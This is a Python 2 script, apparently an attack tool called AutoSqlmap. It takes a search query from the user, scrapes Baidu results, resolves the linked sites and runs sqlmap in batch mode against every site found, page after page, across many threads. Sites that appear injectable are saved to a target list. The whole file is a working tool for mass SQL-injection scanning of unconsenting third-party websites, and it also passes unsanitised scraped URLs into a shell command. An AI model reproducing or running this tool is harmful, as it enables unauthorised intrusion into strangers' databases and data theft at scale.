import time
import os
import re
import urllib,urllib2
import threading

class AutoSqlmap(object):
    List = []
    Targets = []
    #=============================
    def __init__(self,strSearch):
        self.strSearch = strSearch
        self.File = open("Sqlmap_Result.txt","w")
    #=============================
    def __del__(self):
        self.File.close()
    #=============================
    def GetTime(self):
        Time = time.localtime()
        strTime = "[" + str(Time.tm_hour) + ":" + str(Time.tm_min) + ":" + str(Time.tm_sec) + "]"
        return strTime
    #=============================
    def GetWeb(self,nPage):
        key = {"wd":self.strSearch
               ,"rsv_spt":1
               ,"issp":1
               ,"f":8
               ,"rsv_bp":0
               ,"rsv_idx":2
               ,"ie":"utf-8"
               ,"tn":"baiduhome_pg"
               ,"rsv_enter":1
               ,"pn":nPage}    
        strWeb = "http://www.baidu.com/s?" + urllib.urlencode(key)

        try:
            Web = urllib2.urlopen(strWeb)
            html = Web.read()
        except IOError,e:
            print("We get a IOError!")
        
        try:
            Encode_Web = html.decode("utf-8")
        except UnicodeDecodeError:
            Encode_Web = html.decode("gb2312")
        
        return Encode_Web
    #=============================
    def GetTrueURL(self,HashURL):
        Headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11"}
        try:
            Request = urllib2.Request(HashURL,None,Headers)
            Result = urllib2.urlopen(Request,timeout = 5)
            self.List.append(Result.geturl())
        except urllib2.URLError,e:
            print("\033[41;30m" + str(e.reason) + "\033[0;m")
        except urllib2.HTTPError,e:
            print("\033[41;30m" + str(e.code) + " " + str(e.reason) + "\033[0;m")
        except :
            pass
    #=============================
    def Thread_GetTrueURL(self,strHashURL):
        ThreadList = []
        
        for HashURL in strHashURL:
            T = threading.Thread(target = self.GetTrueURL,args = (HashURL,))
            ThreadList.append(T)
        for T in ThreadList:
            T.start()
        for T in ThreadList:
            T.join()
    #=============================
    def GetHashURL(self,html):
        strReg = re.compile("</div><div class=\"f13\"><a target=\"_blank\" href=\"(.*)\" class=\"c-showurl\"")
        Result = strReg.findall(html)
        
        return Result
    #=============================
    def Sqlmap(self,URL,IsBlindInject,nCounter):
        print(str(self.GetTime()) + " [+] The Sqlmap is attempting to check " + URL)
        if IsBlindInject == "Y" or IsBlindInject == "y":
            strCmd = "sqlmap -u " + URL + " --batch " + "--timeout 5 " + "--thread 10 "
        else:
            strCmd = "sqlmap -u " + URL + " --batch " + "--timeout 5 " + "--thread 10 " + "--smart"

        Child = os.popen(strCmd)
        Result = Child.read()
            
        if "[INFO] the back-end DBMS is" in Result:
            print("\033[0;32m" + "[+] The Website " + URL + " may be injectable!" + "\033[0;m")
            self.Targets.append(URL)
        else:
            print("\033[41;30m" + "[+] The Website " + URL + "is not injectable!" + "\033[0;m")
    #=============================
    def Thread_Sqlmap(self,URLList,IsBlindInject):
        ThreadList = []
        nCounter = 1
        
        for URL in URLList:
            T = threading.Thread(target = self.Sqlmap,args = (URL,IsBlindInject,nCounter,))
            ThreadList.append(T)
            nCounter += 1
        for T in ThreadList:
            T.start()
        for T in ThreadList:
            T.join()
        
        if len(self.Targets) == 0:
            print("\033[41;30m" + "There are no targets bing found!" + "\033[0;m")
            self.File.write(self.GetTime() + "There are no targets bing found!\n")
        else:
            print("\033[30;42m" + "[*] Done-----Under are target lists." + "\033[0;m")
            self.File.write(self.GetTime() + "Under are target lists.\n")
            for Target in self.Targets:
                print(Target)
                self.File.write(Target + "\n")
    #=============================
Syntax = raw_input("Enter your Search Syntax:")
nPage = int(raw_input("Enter your startpage:"))
IsQuery = raw_input("Is Query?[Y/N]")
IsBlindInject = raw_input("Is Blind Inject?[Y/N]")

WEB = AutoSqlmap(Syntax)
nPage = nPage * 10 - 10

while True:
    WEB.List = []
    WEB.Targets = []
    
    print("[+] Preparing get html,please wait...")
    html = WEB.GetWeb(nPage)
    
    print("[+] Preparing get HashURL,please wait...")
    HashURL = WEB.GetHashURL(html)
    print("[+] Get " + str(len(HashURL)) + " URL")
    print("[+] Preparing get TrueURL,please wait...")
    WEB.Thread_GetTrueURL(HashURL)
    print("[+] Get " + str(len(WEB.List)) + " URL")
    print("[+] Preparing AutoSqlmap,please wait...")
    WEB.Thread_Sqlmap(WEB.List,IsBlindInject)
    
    if IsQuery == "Y" or IsQuery == "y":
        Is = raw_input("The next Page?[Y/N]")
        if Is == "Y" or Is == "y":
            nPage = nPage + 10
        else:
            break
    else:
        nPage = nPage + 10